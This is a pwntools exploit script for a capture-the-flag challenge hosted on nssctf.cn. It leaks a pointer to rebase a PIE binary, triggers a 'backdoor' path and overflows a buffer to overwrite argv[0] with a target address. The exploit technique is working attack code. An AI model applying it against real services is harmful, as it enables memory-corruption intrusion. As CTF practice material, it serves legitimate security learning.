#!/usr/bin/python3
# -*- encoding: utf-8 -*-

from pwn import *

# context.log_level = "debug"
context.terminal = ['cmd.exe', '/c', 'wt.exe', '-w', '0', '--title', 'gdb', 'bash', '-c']

p = remote("node6.anna.nssctf.cn", 22457)
# p = process('/mnt/c/Users/崔志鹏/Desktop/临时/Attachments/attachment')

target_address = 0x202040
buf_to_argv0 = 0x168

# 64位
context(arch="amd64",os="linux")
stack_len = 0x88 + 0x8

# Get base address and rebase
known_address_offset = 0xCF0

payload = b'a' * 0x10
p.send(payload)
p.recvuntil(payload)

# p.interactive()  # can can need

known_address = u64(p.recvline().strip(b' into the server!\n').ljust(8, b'\x00'))
base_address = known_address - known_address_offset

print("base_address: " + hex(base_address))

p.sendline(b'backdoor')

target_address = target_address + base_address

# Recover argv[0]
payload = b'a' * buf_to_argv0 + p64(target_address)

p.sendline(payload)
# gdb.attach(p)
p.sendline(b'exitexit')

p.interactive()